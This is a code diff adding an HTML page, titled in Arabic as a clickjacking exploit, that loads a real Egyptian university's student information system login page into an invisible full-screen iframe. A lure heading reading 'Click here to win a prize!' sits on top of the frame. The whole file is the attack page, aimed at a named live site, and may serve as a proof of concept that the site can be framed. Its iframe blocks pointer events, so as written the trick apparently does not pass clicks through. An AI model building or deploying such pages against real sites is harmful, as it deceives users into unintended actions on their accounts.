@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>استغلال Clickjacking</title>
+    <style>
+        body {
+            position: relative;
+            width: 100%;
+            height: 100vh;
+            margin: 0;
+        }
+        h1 {
+            position: absolute;
+            z-index: 1; /* اجعل هذا النص فوق الإطار */
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 24px;
+            background-color: rgba(0, 0, 0, 0.5); /* خلفية نصف شفافة */
+            padding: 20px;
+            border-radius: 10px;
+        }
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0; /* اجعل الإطار شفافاً */
+            pointer-events: none; /* اجعل الإطار غير تفاعلي */
+        }
+    </style>
+</head>
+<body>
+    <h1>اضغط هنا للفوز بجائزة!</h1>
+    <iframe src="https://sis.eru.edu.eg/Default.aspx"></iframe>
+</body>
+</html>
